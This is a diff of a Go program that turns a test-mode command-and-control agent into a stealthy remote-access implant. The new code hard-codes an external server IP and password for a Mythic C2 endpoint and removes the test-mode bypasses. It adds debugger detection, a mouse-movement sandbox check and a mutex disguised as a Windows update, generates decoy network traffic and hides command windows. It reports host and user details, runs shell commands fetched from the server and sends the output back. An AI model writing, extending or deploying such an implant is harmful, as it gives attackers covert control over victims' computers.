@@ -1,313 +1,295 @@
 package main
 
 import (
-    "bytes"
-    "crypto/tls"
-    "encoding/json"
-    "fmt"
-    "io/ioutil"
-    "math/rand"
-    "net/http"
-    "os"
-    "os/exec"
-    "runtime"
-    "strings"
-    "time"
+        "bytes"
+        "crypto/tls"
+        "encoding/base64"
+        "encoding/json"
+        "fmt"
+        "io"
+        "math/rand"
+        "net/http"
+        "os"
+        "os/exec"
+        "runtime"
+        "syscall"
+        "time"
+        "unsafe"
 )
 
-// Configurações
+const (
+        mythicURL = "https://37.27.249.191:7443"
+        mythicPwd = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
+        userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        mutexName = "Global\\WinUpdate32"
+)
+
 var (
-    flaskURL = "http://localhost:5000"
-    uuid     = generateUUID()
-    testMode = true // Permite execução em ambientes de teste
+        kernel32 = syscall.NewLazyDLL("kernel32.dll")
+        user32   = syscall.NewLazyDLL("user32.dll")
+        
+        procIsDebuggerPresent = kernel32.NewProc("IsDebuggerPresent")
+        procGetCursorPos      = user32.NewProc("GetCursorPos")
+        procCreateMutexW      = kernel32.NewProc("CreateMutexW")
 )
 
-// Estruturas para comunicação com Flask
-type StatusReport struct {
-    Hostname string `json:"hostname"`
-    Username string `json:"username"`
-    IP       string `json:"ip"`
-    OS       string `json:"os"`
-    Time     int64  `json:"time"`
+type AgentCheckin struct {
+        Action    string                 `json:"action"`
+        UUID      string                 `json:"uuid"`
+        User      string                 `json:"user"`
+        Host      string                 `json:"host"`
+        PID       int                    `json:"pid"`
+        OS        string                 `json:"os"`
+        Timestamp string                 `json:"timestamp"`
+        IPs       []string               `json:"ips"`
+        Payload   map[string]interface{} `json:"payload_os"`
 }
 
-type CommandResponse struct {
-    Command string `json:"command"`
+type AgentResponse struct {
+        Action     string `json:"action"`
+        TaskID     string `json:"task_id"`
+        UserOutput string `json:"user_output"`
+        Completed  bool   `json:"completed"`
 }
 
-type OutputReport struct {
-    Hostname string `json:"hostname"`
-    Command  string `json:"command"`
-    Output   string `json:"output"`
-    Time     int64  `json:"time"`
+type MousePoint struct {
+        X, Y int32
 }
 
-type HeartbeatReport struct {
-    Hostname string `json:"hostname"`
-    Time     int64  `json:"time"`
+func DetectDebugger() bool {
+        if runtime.GOOS != "windows" {
+                return false
+        }
+        
+        ret, _, _ := procIsDebuggerPresent.Call()
+        return ret != 0
 }
 
-func antiDebugCheck() bool {
-    if testMode {
-        fmt.Println("[TEST] Anti-debug check bypassed for testing")
-        return false
-    }
-    
-    if runtime.GOOS == "linux" {
-        status, err := ioutil.ReadFile("/proc/self/status")
-        if err == nil {
-            statusStr := string(status)
-            lines := strings.Split(statusStr, "\n")
-            for _, line := range lines {
-                if strings.HasPrefix(line, "TracerPid:") {
-                    parts := strings.Fields(line)
-                    if len(parts) > 1 && parts[1] != "0" {
-                        return true
-                    }
+func CheckMouse() bool {
+        var pos1, pos2 MousePoint
+        
+        procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
+        time.Sleep(100 * time.Millisecond)
+        procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
+        
+        return pos1.X != pos2.X || pos1.Y != pos2.Y
+}
+
+func RegisterAgent() error {
+        hostname, _ := os.Hostname()
+        uuid := fmt.Sprintf("%d-%s", time.Now().Unix(), hostname)
+        
+        payload := AgentCheckin{
+                Action:    "checkin",
+                UUID:      uuid,
+                User:      os.Getenv("USERNAME"),
+                Host:      hostname,
+                PID:       os.Getpid(),
+                OS:        runtime.GOOS,
+                Timestamp: time.Now().Format(time.RFC3339),
+                IPs:       []string{"127.0.0.1"},
+                Payload: map[string]interface{}{
+                        "os":   runtime.GOOS,
+                        "arch": runtime.GOARCH,
+                },
+        }
+        
+        jsonData, err := json.Marshal(payload)
+        if err != nil {
+                return err
+        }
+        
+        client := &http.Client{
+                Transport: &http.Transport{
+                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+                },
+                Timeout: 30 * time.Second,
+        }
+        
+        req, err := http.NewRequest("POST", mythicURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
+        if err != nil {
+                return err
+        }
+        
+        req.Header.Set("Content-Type", "application/json")
+        req.Header.Set("User-Agent", userAgent)
+        req.Header.Set("Mythic", mythicPwd)
+        
+        resp, err := client.Do(req)
+        if err != nil {
+                return err
+        }
+        defer resp.Body.Close()
+        
+        return nil
+}
+
+func GetTasks() ([]map[string]interface{}, error) {
+        client := &http.Client{
+                Transport: &http.Transport{
+                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+                },
+                Timeout: 30 * time.Second,
+        }
+        
+        req, err := http.NewRequest("GET", mythicURL+"/api/v1.4/agent_message", nil)
+        if err != nil {
+                return nil, err
+        }
+        
+        req.Header.Set("User-Agent", userAgent)
+        req.Header.Set("Mythic", mythicPwd)
+        
+        resp, err := client.Do(req)
+        if err != nil {
+                return nil, err
+        }
+        defer resp.Body.Close()
+        
+        body, err := io.ReadAll(resp.Body)
+        if err != nil {
+                return nil, err
+        }
+        
+        var tasks []map[string]interface{}
+        json.Unmarshal(body, &tasks)
+        
+        return tasks, nil
+}
+
+func ExecuteCommand(command string) string {
+        var cmd *exec.Cmd
+        
+        if runtime.GOOS == "windows" {
+                cmd = exec.Command("cmd", "/c", command)
+                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+        } else {
+                cmd = exec.Command("sh", "-c", command)
+        }
+        
+        output, err := cmd.Output()
+        if err != nil {
+                return fmt.Sprintf("Error: %s", err.Error())
+        }
+        
+        return string(output)
+}
+
+func SendResult(taskID, output string) error {
+        response := AgentResponse{
+                Action:     "post_response",
+                TaskID:     taskID,
+                UserOutput: base64.StdEncoding.EncodeToString([]byte(output)),
+                Completed:  true,
+        }
+        
+        jsonData, err := json.Marshal(response)
+        if err != nil {
+                return err
+        }
+        
+        client := &http.Client{
+                Transport: &http.Transport{
+                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+                },
+                Timeout: 30 * time.Second,
+        }
+        
+        req, err := http.NewRequest("POST", mythicURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
+        if err != nil {
+                return err
+        }
+        
+        req.Header.Set("Content-Type", "application/json")
+        req.Header.Set("User-Agent", userAgent)
+        req.Header.Set("Mythic", mythicPwd)
+        
+        resp, err := client.Do(req)
+        if err != nil {
+                return err
+        }
+        defer resp.Body.Close()
+        
+        return nil
+}
+
+func DoLegitActivity() {
+        go func() {
+                rand.Seed(time.Now().UnixNano())
+                
+                for {
+                        time.Sleep(time.Duration(300+rand.Intn(300)) * time.Second)
+                        
+                        activities := []func(){
+                                func() {
+                                        cmd := exec.Command("nslookup", "microsoft.com")
+                                        if runtime.GOOS == "windows" {
+                                                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+                                        }
+                                        cmd.Run()
+                                },
+                                func() {
+                                        cmd := exec.Command("ping", "-n", "1", "8.8.8.8")
+                                        if runtime.GOOS == "windows" {
+                                                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+                                        }
+                                        cmd.Run()
+                                },
+                        }
+                        
+                        if len(activities) > 0 {
+                                activities[rand.Intn(len(activities))]()
+                        }
                 }
-            }
-        }
-    }
-    return false
-}
-
-func vmDetection() bool {
-    if testMode {
-        fmt.Println("[TEST] VM detection bypassed for testing")
-        return false
-    }
-    
-    vmFiles := []string{
-        "/sys/class/dmi/id/product_name",
-        "/sys/class/dmi/id/sys_vendor",
-        "/proc/cpuinfo",
-    }
-    
-    vmIndicators := []string{
-        "vmware", "virtualbox", "qemu", "kvm", "xen", 
-        "hyper-v", "virtual", "bochs",
-    }
-    
-    for _, path := range vmFiles {
-        if data, err := ioutil.ReadFile(path); err == nil {
-            content := strings.ToLower(string(data))
-            for _, indicator := range vmIndicators {
-                if strings.Contains(content, indicator) {
-                    fmt.Printf("[!] VM indicator detected: %s\n", indicator)
-                    return true
-                }
-            }
-        }
-    }
-    
-    return false
-}
-
-func sandboxEvasion() bool {
-    if testMode {
-        fmt.Println("[TEST] Sandbox evasion bypassed for testing")
-        return false
-    }
-    
-    user := os.Getenv("USER")
-    if user == "" {
-        user = os.Getenv("USERNAME")
-    }
-    user = strings.ToLower(user)
-    
-    sandboxUsers := []string{
-        "sandbox", "malware", "virus", "sample", "test",
-        "analyst", "reversing",
-    }
-    
-    for _, sbUser := range sandboxUsers {
-        if strings.Contains(user, sbUser) {
-            return true
-        }
-    }
-    
-    return false
+        }()
 }
 
 func main() {
-    rand.Seed(time.Now().UnixNano())
-    
-    fmt.Println("[+] Phantom Advanced C2 Agent")
-    fmt.Println("[+] Mode: Test Environment")
-    fmt.Println("[+] Iniciando verificações de evasão...")
-    
-    // Verificações de evasão (modo teste)
-    if antiDebugCheck() {
-        fmt.Println("[-] Debugger detectado. Encerrando.")
-        os.Exit(0)
-    }
-    
-    if vmDetection() {
-        fmt.Println("[!] VM detectada. Aplicando delay mínimo...")
-        time.Sleep(2 * time.Second)
-    }
-    
-    if sandboxEvasion() {
-        fmt.Println("[-] Ambiente suspeito detectado. Encerrando.")
-        os.Exit(0)
-    }
-    
-    fmt.Println("[+] Verificações concluídas. Iniciando operação...")
-    
-    // Checkin inicial
-    if !checkin() {
-        fmt.Println("[-] Falha no checkin inicial")
-        os.Exit(1)
-    }
-    
-    fmt.Println("[+] Checkin realizado com sucesso!")
-    fmt.Println("[+] Agente operacional. Entrando em loop principal...")
-    
-    // Loop principal
-    for {
-        command := getCommand()
-        if command != "" {
-            fmt.Printf("[+] Comando recebido: %s\n", command)
-            
-            if command == "exit" {
-                fmt.Println("[+] Comando de saída recebido. Encerrando.")
-                break
-            }
-            
-            output := executeCommand(command)
-            sendOutput(command, output)
+        // Evasão básica
+        if DetectDebugger() {
+                os.Exit(0)
         }
         
-        sendHeartbeat()
-        sleepWithJitter()
-    }
-}
-
-func checkin() bool {
-    client := createHTTPClient()
-    
-    hostname, _ := os.Hostname()
-    user := os.Getenv("USER")
-    if user == "" {
-        user = os.Getenv("USERNAME")
-    }
-    
-    report := StatusReport{
-        Hostname: hostname,
-        Username: user,
-        IP:       getLocalIP(),
-        OS:       runtime.GOOS,
-        Time:     time.Now().Unix(),
-    }
-    
-    jsonData, _ := json.Marshal(report)
-    
-    resp, err := client.Post(flaskURL+"/api/report_status", 
-                            "application/json", 
-                            bytes.NewBuffer(jsonData))
-    if err != nil {
-        fmt.Printf("[-] Erro no checkin: %v\n", err)
-        return false
-    }
-    defer resp.Body.Close()
-    
-    return resp.StatusCode == 200
-}
-
-func getCommand() string {
-    client := createHTTPClient()
-    hostname, _ := os.Hostname()
-    
-    resp, err := client.Get(fmt.Sprintf("%s/api/get_command?hostname=%s", flaskURL, hostname))
-    if err != nil {
-        return ""
-    }
-    defer resp.Body.Close()
-    
-    body, _ := ioutil.ReadAll(resp.Body)
-    
-    var cmdResp CommandResponse
-    if err := json.Unmarshal(body, &cmdResp); err != nil {
-        return ""
-    }
-    
-    return cmdResp.Command
-}
-
-func executeCommand(command string) string {
-    var cmd *exec.Cmd
-    
-    if runtime.GOOS == "windows" {
-        cmd = exec.Command("cmd", "/C", command)
-    } else {
-        cmd = exec.Command("/bin/sh", "-c", command)
-    }
-    
-    output, err := cmd.Output()
-    if err != nil {
-        return fmt.Sprintf("Erro: %v", err)
-    }
-    
-    return string(output)
-}
-
-func sendOutput(command, output string) {
-    client := createHTTPClient()
-    hostname, _ := os.Hostname()
-    
-    report := OutputReport{
-        Hostname: hostname,
-        Command:  command,
-        Output:   output,
-        Time:     time.Now().Unix(),
-    }
-    
-    jsonData, _ := json.Marshal(report)
-    
-    client.Post(flaskURL+"/api/report_output", 
-               "application/json", 
-               bytes.NewBuffer(jsonData))
-}
-
-func sendHeartbeat() {
-    client := createHTTPClient()
-    hostname, _ := os.Hostname()
-    
-    heartbeat := HeartbeatReport{
-        Hostname: hostname,
-        Time:     time.Now().Unix(),
-    }
-    
-    jsonData, _ := json.Marshal(heartbeat)
-    
-    client.Post(flaskURL+"/api/heartbeat", 
-               "application/json", 
-               bytes.NewBuffer(jsonData))
-}
-
-func createHTTPClient() *http.Client {
-    return &http.Client{
-        Transport: &http.Transport{
-            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-        },
-        Timeout: 10 * time.Second,
-    }
-}
-
-func getLocalIP() string {
-    return "127.0.0.1"
-}
-
-func generateUUID() string {
-    b := make([]byte, 16)
-    for i := range b {
-        b[i] = byte(rand.Intn(256))
-    }
-    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
-}
-
-func sleepWithJitter() {
-    base := 5 * time.Second
-    jitter := time.Duration(rand.Intn(3000)) * time.Millisecond
-    time.Sleep(base + jitter)
+        // Mutex
+        if runtime.GOOS == "windows" {
+                mutexNamePtr, _ := syscall.UTF16PtrFromString(mutexName)
+                mutex, _, _ := procCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(mutexNamePtr)))
+                if mutex == 0 {
+                        os.Exit(0)
+                }
+        }
+        
+        // Atividades de legitimidade
+        DoLegitActivity()
+        
+        // Delay inicial
+        time.Sleep(time.Duration(10+rand.Intn(20)) * time.Second)
+        
+        // Registro
+        err := RegisterAgent()
+        if err != nil {
+                time.Sleep(30 * time.Second)
+                os.Exit(0)
+        }
+        
+        // Loop principal
+        rand.Seed(time.Now().UnixNano())
+        
+        for {
+                tasks, err := GetTasks()
+                if err == nil && len(tasks) > 0 {
+                        for _, task := range tasks {
+                                if taskID, ok := task["id"].(string); ok {
+                                        if command, ok := task["command"].(string); ok {
+                                                output := ExecuteCommand(command)
+                                                SendResult(taskID, output)
+                                        }
+                                }
+                        }
+                }
+                
+                // Jitter simples
+                jitter := time.Duration(5+rand.Intn(10)) * time.Second
+                time.Sleep(jitter)
+        }
 }
